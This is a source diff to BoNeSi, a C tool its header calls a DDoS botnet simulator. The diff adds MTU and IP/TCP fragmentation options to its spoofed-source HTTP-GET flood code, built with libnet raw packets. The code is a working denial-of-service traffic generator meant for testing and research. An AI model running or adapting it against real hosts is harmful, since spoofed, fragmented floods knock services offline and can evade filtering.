@@ -14,7 +14,7 @@
  * Purpose: a DDoS Botnet Simulator for spoofing ICMP,UDP attacks and HTTP-GET floods
  * Responsible: Matthias Reif
  * Primary Repository: http://bonesi.googlecode.com/svn/trunk/ 
- * Web Sites: www.iupr.org, www.dfki.de, http://code.google.com/p/bonesi/
+ * Web Sites: madm.dfki.de, http://code.google.com/p/bonesi/
  */
 
 #include <stdio.h>
@@ -63,6 +63,10 @@ typedef struct {
     int referer;
     ///index to useragent in useragents
     int useragent;
+    ///index to url number
+    int url;
+    ///payload offset
+    int pload_offset;
 } Connection;
 
 unsigned long cnt;
@@ -91,6 +95,8 @@ int toggle = 0;
 int maxPackets = 0;
 int url_flag = 0; //flag to indicate if a url has been specified with parameter -u
 char request[URL_SIZE];
+unsigned int MTU = 0;
+unsigned int fragMode = 99;
 
 pthread_t pcapThread;
 extern char *optarg;
@@ -446,8 +452,11 @@ void printUsage(int argc, char *argv[]) {
     printf("  -l, --url_list=FILENAME          filename with url list (only for tcp/http)\n");
     printf("  -b, --useragent_list=FILENAME    filename with useragent list (only for tcp/http)\n");
     printf("  -d, --device=DEVICE              network listening device (only for tcp/http)\n");
+    printf("  -m, --mtu=NUM                    set MTU, (default 1500)\n");
+    printf("  -f, --frag=NUM                   set fragmentation mode (0=IP, 1=TCP, default: 0)\n");
     printf("  -v, --verbose                    print additional debug messages\n");
     printf("  -h, --help                       print this message and exit\n");
+
     printf("\n");
 }
 
@@ -471,7 +480,9 @@ void parseArgs(int argc, char *argv[]) {
         {"useragent_list", required_argument, 0, 'b'},
         {"device", required_argument, 0, 'd'},
         {"integer", no_argument, &integer, 1},
-        {"verbose", no_argument, 0, 'v'},
+        {"mtu", no_argument, 0, 'm'},
+        {"frag", no_argument, 0, 'f'},
+	{"verbose", no_argument, 0, 'v'},
         {"help", no_argument, 0, 'h'},
         {0, 0, 0, 0}
     };
@@ -487,7 +498,7 @@ void parseArgs(int argc, char *argv[]) {
     u.host[0] = '\0';
     u.path[0] = '\0';
     u.protocol [0] = '\0';    
-    while ((c = getopt_long(argc, argv, ":b:s:r:p:i:o:c:t:hvu:l:d:",long_options, &option_index)) != -1) {
+    while ((c = getopt_long(argc, argv, ":b:s:r:p:i:o:c:t:hvu:l:d:m:f:",long_options, &option_index)) != -1) {
         switch (c) {
         case 'b':
             useragentfilename = optarg;
@@ -533,6 +544,13 @@ void parseArgs(int argc, char *argv[]) {
         case 'd':
             device = optarg;
             break;
+        case 'm':
+            MTU = ((abs(atoi(optarg))+7)/8)*8;
+            break;
+        case 'f':
+            fragMode= abs(atoi(optarg));
+            if (fragMode != 0 && fragMode != 1) fragMode = 0;
+            break;
         }
     }
     // -- parse destination address and port --
@@ -577,6 +595,19 @@ void parseArgs(int argc, char *argv[]) {
         nuseragents = 1;
         printf("The user-agent:\n %s\nwill be used.\n", useragents[0]);
     }
+    if (proto != IPPROTO_TCP && (MTU != 0 || fragMode != 99)) {
+        printf("-f and -m (Fragmentation support) only for TCP available\n");
+        exit(EXIT_FAILURE);
+    }
+    else {
+      // set defaults if TCP and fragmentation not set.
+      if (MTU == 0) {
+	MTU = 1500;
+      }
+      if (fragMode == 99) {
+	fragMode = 0;
+      }
+    }
 }
 
 /**
@@ -587,6 +618,11 @@ void printArgs() {
     printf("dstPort:       %d\n", dstPort);
     printf("protocol:      %d\n", proto);
     printf("payloadSize:   %d\n", payloadSize);
+    if (proto == IPPROTO_TCP) {
+      printf("MTU:           %d\n", MTU);
+      (fragMode > 0) ? printf("fragment mode: TCP\n")
+	      : printf("fragment mode: IP\n");
+    }
     (rate > 0) ? printf("rate:          %d\n", rate)
             : printf("rate:          infinite\n");
     printf("ips:           %s\n", filename);
@@ -692,7 +728,11 @@ void acknowledge(libnet_t *libnetHandle, pcap_t* pcapHandle) {
     static const u_char *sniffedPacket;
     static const struct iphdr* ip;
     static const struct tcphdr* tcp;
-    
+    unsigned int max_pload_size;
+    int packet_pload_size, total_pload_size;
+    int pload_offset;
+    u_int8_t *p;
+
     //printf("achnowledge\n");
     //static size_t x = 0;
     sniffedPacket = pcap_next(pcapHandle, &header);
@@ -758,9 +798,6 @@ void acknowledge(libnet_t *libnetHandle, pcap_t* pcapHandle) {
                 printf("While: url: %d, ref: %d\n", url_number, ref_number);
             }
         }
-        if(urls.size > 1){
-            connections[key].referer = url_number;
-        }
         
         // build the request with url, referer and useragent numbers
         buildRequest(request, url_number, ref_number, useragent_number, urls, useragents);
@@ -771,19 +808,211 @@ void acknowledge(libnet_t *libnetHandle, pcap_t* pcapHandle) {
         
         uint32_t remoteAck = ntohl(tcp->ack_seq);
         uint32_t remoteSeq = ntohl(tcp->seq);
-        libnet_clear_packet(libnetHandle);
-        if(libnet_build_tcp(origSrcPort, dstPort, remoteAck, remoteSeq+1, 
-                TH_ACK, WINDOW_SIZE, 0, 0, LIBNET_IPV4_H + LIBNET_TCP_H - 20 + strlen(request),
-                (unsigned char*)request, strlen(request), libnetHandle, 0)==-1) {
-            fprintf(stderr, "Can't build tcp header: %s\n", libnet_geterror(libnetHandle));
-        }
-        buildIp(strlen(request), libnetHandle, 0, sIp);
-        if (libnet_write(libnetHandle) == -1) {
-            fprintf(stderr, "Can't send tcp ack/fin packet: %s\n", libnet_geterror(libnetHandle));
+        max_pload_size = (MTU - LIBNET_IPV4_H - LIBNET_TCP_H);
+        max_pload_size -= (max_pload_size % 8);
+        total_pload_size = strlen(request);
+        if (max_pload_size > total_pload_size) {
+            // -- packet is smaller than MTU --
+            if(urls.size > 1){
+                connections[key].referer = url_number;
+            }
+            libnet_clear_packet(libnetHandle);
+            if(libnet_build_tcp(origSrcPort, dstPort, remoteAck, remoteSeq+1, 
+                    TH_ACK, WINDOW_SIZE, 0, 0, LIBNET_IPV4_H + LIBNET_TCP_H - 20 + total_pload_size,
+                    (unsigned char*)request, total_pload_size, libnetHandle, 0)==-1) {
+                fprintf(stderr, "Can't build tcp header: %s\n", libnet_geterror(libnetHandle));
+            }
+            buildIp(total_pload_size, libnetHandle, 0, sIp);
+            if (libnet_write(libnetHandle) == -1) {
+                fprintf(stderr, "Can't send tcp ack/fin packet: %s\n", libnet_geterror(libnetHandle));
+            }
+        } else {
+            // -- fragmentation goes here --
+            if (fragMode == 0) {
+                // -- using IP fragmentation --
+                if(urls.size > 1){
+                    connections[key].referer = url_number;
+                }
+
+                int hdr_offset = IP_MF;
+                u_int16_t ip_id;
+                u_int32_t pkt_chksum, pbuf_size, pbuf_size2;
+                libnet_ptag_t tcp_tag, ip_tag;
+                struct libnet_ipv4_hdr *iph_p;
+                struct libnet_tcp_hdr *tcph_p;
+                u_int8_t *packet;
+
+                libnet_clear_packet(libnetHandle);
+                ip_id = (u_int16_t)libnet_get_prand(LIBNET_PR16);
+                packet_pload_size = max_pload_size;
+
+                tcp_tag = libnet_build_tcp(origSrcPort, dstPort, remoteAck, remoteSeq+1, 
+                        TH_ACK, WINDOW_SIZE, 0, 0, LIBNET_IPV4_H + LIBNET_TCP_H - 20 + total_pload_size,
+                        (unsigned char*)request, total_pload_size, libnetHandle, 0);
+                if(tcp_tag==-1) {
+                    fprintf(stderr, "Can't build tcp header: %s\n", libnet_geterror(libnetHandle));
+                }
+
+                ip_tag = libnet_build_ipv4(
+                            LIBNET_IPV4_H + total_pload_size,
+                            0, /* TOS */
+                            ip_id,
+                            0, /* IP Frag */
+                            (rand() % 253) + 3, /* TTL */
+                            proto,
+                            0, /* checksum */ 
+                            sIp, dstIp,
+                            NULL, /* payload */
+                            0, /* payload size */
+                            libnetHandle, ipTag);
+                if (ip_tag == -1) {
+                        fprintf(stderr, "Can't build ipv4 header: %s\n", libnet_geterror(libnetHandle));
+                }
+
+                u_int8_t *pkt_buf;
+
+                pbuf_size = libnet_getpbuf_size(libnetHandle, ip_tag);
+                pbuf_size2 = libnet_getpbuf_size(libnetHandle, tcp_tag);
+                pkt_buf = malloc(pbuf_size+pbuf_size2+total_pload_size);
+
+                p = pkt_buf;
+                packet = libnet_getpbuf(libnetHandle, ip_tag);
+                memcpy(p, packet, pbuf_size);
+                p += pbuf_size;
+                packet = libnet_getpbuf(libnetHandle, tcp_tag);
+                memcpy(p, packet, pbuf_size2);
+                p += pbuf_size2;
+                memcpy(p, request, total_pload_size);
+
+                iph_p = (struct libnet_ipv4_hdr *)(pkt_buf);
+                tcph_p = (struct libnet_tcp_hdr *)(pkt_buf + (iph_p->ip_hl << 2));
+                libnet_do_checksum(libnetHandle, pkt_buf, IPPROTO_TCP, pbuf_size2+total_pload_size);
+
+                libnet_clear_packet(libnetHandle);
+
+                p = (u_int8_t *)tcph_p;
+                total_pload_size += pbuf_size2;
+
+                if (libnet_build_ipv4(
+                        LIBNET_IPV4_H + packet_pload_size,
+                        0, /* TOS */
+                        ip_id,
+                        hdr_offset, /* IP Frag */
+                        (rand() % 253) + 3, /* TTL */
+                        proto,
+                        0, /* checksum */ 
+                        sIp, dstIp,
+                        (unsigned char *)p, /* payload */
+                        packet_pload_size, /* payload size */
+                        libnetHandle, ipTag) == -1) {
+                    fprintf(stderr, "Can't build ipv4 header: %s\n", libnet_geterror(libnetHandle));
+                }
+                if (libnet_write(libnetHandle) == -1) {
+                    fprintf(stderr, "Can't send tcp ack/fin packet: %s\n", libnet_geterror(libnetHandle));
+                }
+                pload_offset = packet_pload_size;
+                libnet_clear_packet(libnetHandle);
+            
+                max_pload_size = (MTU - LIBNET_IPV4_H);
+                max_pload_size -= (max_pload_size % 8);
+        
+                while (total_pload_size > pload_offset) {
+                    if (max_pload_size > (total_pload_size - pload_offset)) {
+                        hdr_offset = pload_offset/8;
+                        packet_pload_size = total_pload_size - pload_offset;
+                    } else {
+                        hdr_offset = IP_MF + pload_offset/8;
+                        packet_pload_size = max_pload_size;
+                    }
+                    if (libnet_build_ipv4(
+                            LIBNET_IPV4_H + packet_pload_size,
+                            0, /* TOS */
+                            ip_id,
+                            hdr_offset, /* IP Frag */
+                            (rand() % 253) + 3, /* TTL */
+                            proto,
+                            0, /* checksum */ 
+                            sIp, dstIp,
+                            (unsigned char*)(p + pload_offset), /* payload */
+                            packet_pload_size, /* payload size */
+                            libnetHandle, ipTag) == -1) {
+                        fprintf(stderr, "Can't build ipv4 header: %s\n", libnet_geterror(libnetHandle));
+                    }
+                    if (libnet_write(libnetHandle) == -1) {
+                        fprintf(stderr, "Can't send tcp ack/fin packet: %s\n", libnet_geterror(libnetHandle));
+                    }
+                    pload_offset += packet_pload_size;
+                    libnet_clear_packet(libnetHandle);
+                }
+                free(pkt_buf);
+            } else if (fragMode == 1) {
+                // -- using TCP fragments --
+                libnet_clear_packet(libnetHandle);
+
+                // we send only first packet here, all the others will be sent in Ack handler
+                if(libnet_build_tcp(origSrcPort, dstPort, remoteAck, remoteSeq+1, 
+                        TH_ACK, WINDOW_SIZE, 0, 0, LIBNET_IPV4_H + LIBNET_TCP_H - 20 + max_pload_size,
+                        (unsigned char*)request, max_pload_size, libnetHandle, 0)==-1) {
+                        fprintf(stderr, "Can't build tcp header: %s\n", libnet_geterror(libnetHandle));
+                }
+                buildIp(max_pload_size, libnetHandle, 0, sIp);
+                if (libnet_write(libnetHandle) == -1) {
+                    fprintf(stderr, "Can't send tcp ack/fin packet: %s\n", libnet_geterror(libnetHandle));
+                }
+                libnet_clear_packet(libnetHandle);
+
+                connections[key].pload_offset = max_pload_size;
+                connections[key].url = url_number;            }
         }
     // -- acknowledge every but reset packets and the final ack packet --
-    } else if(! tcp->rst && (connections[key].status == ESTABLISHED || connections[key].status == CONNECTING)) {
+    } else if(! tcp->rst && connections[key].status == CONNECTING) {
         sendAck(libnetHandle, ip, tcp, key);
+    } else if(! tcp->rst && connections[key].status == ESTABLISHED) {
+        if (fragMode == 1) {
+            if (tcp->ack) {
+
+                max_pload_size = (MTU - LIBNET_IPV4_H - LIBNET_TCP_H);
+                max_pload_size -= (max_pload_size % 8);
+
+                uint32_t remoteAck = htonl(tcp->ack_seq);
+                uint32_t remoteSeq = htonl(tcp->seq);
+
+                int url_number = connections[key].url;
+                int ref_number = connections[key].referer;
+                int useragent_number = connections[key].useragent;
+                buildRequest(request, url_number, ref_number, useragent_number, urls, useragents);
+                p = (unsigned char *)request;
+                total_pload_size = strlen(request);
+                pload_offset = connections[key].pload_offset;
+
+                if ((total_pload_size - pload_offset) == 0) {
+                    sendAck(libnetHandle, ip, tcp, key);
+                    connections[key].status = CLOSED;
+                } else {
+                    if (max_pload_size > (total_pload_size - pload_offset)) {
+                        packet_pload_size = total_pload_size - pload_offset;
+                    } else {
+                        packet_pload_size = max_pload_size;
+                    }
+
+                    libnet_clear_packet(libnetHandle);
+                    if(libnet_build_tcp(origSrcPort, dstPort, remoteAck, remoteSeq, 
+                            TH_ACK, WINDOW_SIZE, 0, 0, LIBNET_IPV4_H + LIBNET_TCP_H - 20 + packet_pload_size,
+                            (unsigned char*)(p + pload_offset), packet_pload_size, libnetHandle, 0)==-1) {
+                        fprintf(stderr, "Can't build tcp header _ : %s\n", libnet_geterror(libnetHandle));
+                    }
+                    buildIp(packet_pload_size, libnetHandle, 0, sIp);
+                    if (libnet_write(libnetHandle) == -1) {
+                        fprintf(stderr, "Can't send tcp ack/fin packet: %s\n", libnet_geterror(libnetHandle));
+                    }
+                    libnet_clear_packet(libnetHandle);
+
+                    connections[key].pload_offset = pload_offset + packet_pload_size;
+                }
+            }
+        } else {
+            sendAck(libnetHandle, ip, tcp, key);
+        }
     // -- connection probably closed -> 'clear' port --
     } else if (tcp->ack) {
         connections[key].status = NOT_CONNECTED; // no connection
